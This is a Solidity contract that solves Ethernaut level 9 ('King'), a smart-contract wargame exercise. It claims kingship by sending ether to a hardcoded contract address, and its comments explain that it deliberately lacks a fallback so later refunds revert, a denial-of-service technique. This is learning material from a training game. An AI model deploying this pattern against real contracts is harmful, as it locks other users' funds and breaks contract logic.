//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract EthernautLevel9 {
    //The goal is to become the king and stop the contract/level from regaining kingship.
    //It can be achieved by reverting KingContracts transfer to the king(us) by not defining a fallback so that
    //this contract cannot recieve ether and the transaction fails
    address payable kingContractAddress =
        payable(0xcC633cD2bC97f216b3Ab8948A6A784Fc766c8018);
    address public owner;
    uint256 public amount;

    //sending contract some balance through constructor
    constructor() payable {
        owner = msg.sender;
        amount = msg.value;
    }

    //KingContract holds 0.001 ether currently, so to become king sending an amount greater than that.
    //The gas estimates for this transaction were extremely off.
    //After failing a number of times I checked up on why it kept failing even after I increased gas limit,
    //It was because the wallet/metamask failed to include the transaction happening on the contract side
    //i.e the transfer transaction so gas was always used up midway. Increased the gas limit by a lot
    //and it worked.

    function becomeKing() external payable returns (bool) {
        (bool success, ) = address(kingContractAddress).call{
            value: amount,
            gas: 3000000
        }("");
        return success;
    }

    //collect the balance after level is cleared and clean up
    function selfDestruct() external {
        selfdestruct(payable(owner));
    }
}
